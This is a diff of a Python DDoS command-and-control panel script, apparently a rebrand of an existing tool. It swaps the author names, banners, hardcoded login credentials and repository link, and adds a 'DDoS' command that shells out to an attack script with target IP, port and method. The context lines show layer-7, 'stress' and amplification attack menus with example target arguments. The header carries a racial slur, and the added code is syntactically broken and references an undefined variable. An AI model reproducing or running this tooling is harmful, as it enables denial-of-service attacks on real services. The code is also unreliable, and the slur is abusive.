@@ -1,7 +1,7 @@
-##############################
-# ZxCDDoS Made by zxcr9999   #
-# COPY = NIGGER              #
-##############################
+______________________________
+┃ kLzDDoS Made by dylanklz   ┃
+┃ COPY = NIGGER              ┃
+______________________________
 
 import socket
 import os
@@ -10,6 +10,7 @@ import random
 import getpass
 import time
 import sys
+import pyfiglet
 
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -84,7 +85,7 @@ def ascii_vro():
     clear()
 
 def si():
-    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mZxC \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to ZxC PN! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: zxcr9999 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
+    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mDYLKLZ \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mkillaz DDOS! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: dylanKLZ \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
     print("")
 
 def tools():
@@ -156,7 +157,7 @@ def special():
                                 \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mSpecial    \x1b[38;2;0;212;14m║
                 \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                 \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mstress              \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
-                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
+                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mDDoS             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                 \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                 \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                 \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
@@ -216,18 +217,19 @@ def amp_games():
 def menu():
     sys.stdout.write(f"         \x1b]2;ZxC C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
     clear()
-    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mZxC \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to ZxC C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: zxcr9999 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1| Store: https://condi.billgang.store/')
+    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mDly \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Dylan C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: DylanKLZ \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1| Store: https://condi.billgang.store/')
     print("")
     print("""
-                        \x1b[38;2;0;212;14m╔═╗ \x1b[38;2;0;186;45m ═╗ ╦  ╔═\x1b[38;2;0;150;88m╗  ╔╦╗ \x1b[38;2;0;113;133m ╔╦╗ \x1b[38;2;0;83;168m ╔═╗ \x1b[38;2;0;49;147m ╔═╗
-                        \x1b[38;2;0;212;14m╔═╝ \x1b[38;2;0;186;45m ╔╩╦╝  ║ \x1b[38;2;0;150;88m    ║║ \x1b[38;2;0;113;133m  ║║ \x1b[38;2;0;83;168m ║ ║ \x1b[38;2;0;49;147m ╚═╗
-                        \x1b[38;2;0;212;14m╚═╝ \x1b[38;2;0;186;45m ╩ ╚═  ╚═\x1b[38;2;0;150;88m╝  ═╩╝ \x1b[38;2;0;113;133m ═╩╝ \x1b[38;2;0;83;168m ╚═╝ \x1b[38;2;0;49;147m ╚═╝
+                        \x1b[38;2;0;212;14m ╔══╗\x1b[38;2;0;186;45m ╔╗\x1b[38;2;0;150;88m╗ ╔═╦╗ \x1b[38;2;0;113;133m \x1b[38;2;0;83;168m \x1b[38;2;0;49;147m 
+                        \x1b[38;2;0;212;14m ╚╗╗║\x1b[38;2;0;186;45m ║║ \x1b[38;2;0;150;88m  ╚╗║║  \x1b[38;2;0;113;133m \x1b[38;2;0;83;168m \x1b[38;2;0;49;147m 
+                         \x1b[38;2;0;212;14m╔╩╝║ \x1b[38;2;0;186;45m║╚╗\x1b[38;2;0;150;88m ╔╩╗║  \x1b[38;2;0;113;133m \x1b[38;2;0;83;168m \x1b[38;2;0;49;147m 
+                        \x1b[38;2;0;212;14m ╚══╝ \x1b[38;2;0;186;45m╚═╝ \x1b[38;2;0;150;88m╚══╝   \x1b[38;2;0;113;133m \x1b[38;2;0;83;168m \x1b[38;2;0;49;147m 
                 \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
-                \x1b[38;2;0;212;14m║          \x1b[38;2;239;239;239mWelcome to ZxC C2 DDoS Panel        \x1b[38;2;0;49;147m║
-                \x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - - - - - \x1b[38;2;239;239;239mFree DDoS Panel 2022\x1b[38;2;0;212;14m- - - - - - -\x1b[38;2;0;49;147m║
+                \x1b[38;2;0;212;14m║          \x1b[38;2;239;239;239mWelcome to DYLKLZ C2 DDoS Panel        \x1b[38;2;0;49;147m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - - - - - \x1b[38;2;239;239;239mRECODE C2 DDOS \x1b[38;2;0;212;14m- - - - - - -\x1b[38;2;0;49;147m║
                 \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
                     \x1b[38;2;0;212;14m╔═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╗
-                    \x1b[38;2;0;212;14m║ \x1b[38;2;239;239;239mhttps://github.com/hoaan1995/ZxCDDoS \x1b[38;2;0;49;147m║
+                    \x1b[38;2;0;212;14m║ \x1b[38;2;239;239;239mhttps://github.com/DylanMabait/dylanklz \x1b[38;2;0;49;147m║
                     \x1b[38;2;0;212;14m╚═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╝
                 \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
                 \x1b[38;2;0;212;14m║   \x1b[38;2;239;239;239m   Type help to see the all commands.      \x1b[38;2;0;49;147m║
@@ -237,7 +239,7 @@ def menu():
 def main():
     menu()
     while(True):
-        cnc = input('''\x1b[38;2;0;212;14m╔══[C2\x1b[38;2;0;186;45m@Z\x1b[38;2;0;150;88mx\x1b[38;2;0;113;133mC\x1b[38;2;0;49;147m]
+        cnc = input('''\x1b[38;2;0;212;14m╔══[C2\x1b[38;2;0;186;45m@D\x1b[38;2;0;150;88mL\x1b[38;2;0;113;133mY\x1b[38;2;0;49;147m]
 \x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
         if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
             layer7()
@@ -399,6 +401,17 @@ def main():
                 print('      [3] HTTP')
                 print('Example: stress 1.1.1.1 80 3 1250 60 5')
                 
+                 elif "DDos" in cnc
+                    try:
+                    	ip = cnc.split()[1]
+                        domain = cnc.split()[2]
+                        time = cnc.split()[3]
+                        os.system(f'go run python DDoS.py {ip} {port} {method}')
+                        except IndexError
+                            print('Usage: DDoS.py <ip> <port> <method>')
+                            print('Example: DDos.py 1.1.1.1 7777 UDP-mix')
+                        
+                           
 # AMP/GAMES METHODS
 
         elif "samp" in cnc:
@@ -773,16 +786,16 @@ CLEAR   ► CLEAR TERMINAL
 
 def login():
     clear()
-    user = "admin"
-    passwd = "admin"
-    username = input("⚡ Username: ")
-    password = getpass.getpass(prompt='⚡ Password: ')
+    user = "dylan"
+    passwd = "killazontop"
+    username = input(" Username: ")
+    password = getpass.getpass(prompt=' Password: ')
     if username != user or password != passwd:
         print("")
-        print("⚡ Haizzz, you're so cute...")
+        print(" Ang Kupal mo naman bai")
         sys.exit(1)
     elif username == user and password == passwd:
-        print("⚡ Welcome to ZxC C2!")
+        print(" Welcome to DylanKLZ C2!")
         time.sleep(0.3)
         ascii_vro()
         main()
